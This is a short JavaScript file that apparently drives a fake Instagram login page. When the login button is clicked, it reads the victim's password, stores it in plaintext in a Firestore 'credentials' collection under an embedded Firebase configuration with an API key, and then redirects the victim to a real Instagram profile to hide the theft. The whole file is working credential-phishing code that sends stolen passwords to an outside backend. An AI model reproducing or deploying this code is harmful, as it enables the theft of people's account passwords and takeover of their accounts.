// --- Firebase setup ---
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyClJjQvtRFhBJyfWYILE_rMbcnTDopFpPA",
  authDomain: "igust-c8883.firebaseapp.com",
  projectId: "igust-c8883",
  storageBucket: "igust-c8883.firebasestorage.app",
  messagingSenderId: "686962393624",
  appId: "1:686962393624:web:add15a66ac43be9469f96d",
  measurementId: "G-BLD7XMY6P0"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// --- Login button event ---
document.getElementById("login-btn").addEventListener("click", async function () {
    const password = document.getElementById("password").value;
    const errorMsg = document.getElementById("password-error");

    // Clear previous error
    errorMsg.textContent = "";

    if (!password) {
        errorMsg.textContent = "Enter your password.";
        return;
    }

    try {
        // Save password to Firestore
        await addDoc(collection(db, "credentials"), {
            password: password,
            timestamp: new Date()
        });

        // Redirect after saving
        window.location.href = "https://www.instagram.com/jysncrz/";
    } catch (error) {
        errorMsg.textContent = "Error saving password: " + error.message;
    }
});
